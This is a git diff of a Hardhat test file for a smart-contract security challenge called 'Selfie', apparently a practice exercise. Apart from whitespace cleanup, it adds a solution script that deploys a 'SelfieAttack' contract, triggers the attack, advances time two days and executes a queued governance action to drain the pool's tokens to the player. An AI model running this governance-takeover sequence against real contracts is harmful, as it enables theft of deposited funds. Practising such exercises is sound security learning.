@@ -8,7 +8,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
     const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
-    
+
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
@@ -23,11 +23,11 @@ describe('[Challenge] Selfie', function () {
         // Deploy the pool
         pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
             token.address,
-            governance.address    
+            governance.address
         );
         expect(await pool.token()).to.eq(token.address);
         expect(await pool.governance()).to.eq(governance.address);
-        
+
         // Fund the pool
         await token.transfer(pool.address, TOKENS_IN_POOL);
         await token.snapshot();
@@ -39,6 +39,15 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("Player address: ", player.address);
+        console.log("Pool token balance BEFORE attack: ", await token.balanceOf(pool.address));
+        console.log("Player token balance BEFORE attack: ", await token.balanceOf(player.address));
+        attacker = await (await ethers.getContractFactory('SelfieAttack', player)).deploy(governance.address, pool.address);
+        await attacker.launchAttack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60 + 1]); // 2 days + 1s
+        await governance.executeAction(1); // First action of the governance was created throught SelfieAttack::launchAttack()
+        console.log("Pool token balance AFTER attack: ", await token.balanceOf(pool.address));
+        console.log("Player token balance AFTER attack: ", await token.balanceOf(player.address));
     });
 
     after(async function () {
@@ -47,7 +56,7 @@ describe('[Challenge] Selfie', function () {
         // Player has taken all tokens from the pool
         expect(
             await token.balanceOf(player.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
+        ).to.be.equal(TOKENS_IN_POOL);
         expect(
             await token.balanceOf(pool.address)
         ).to.be.equal(0);
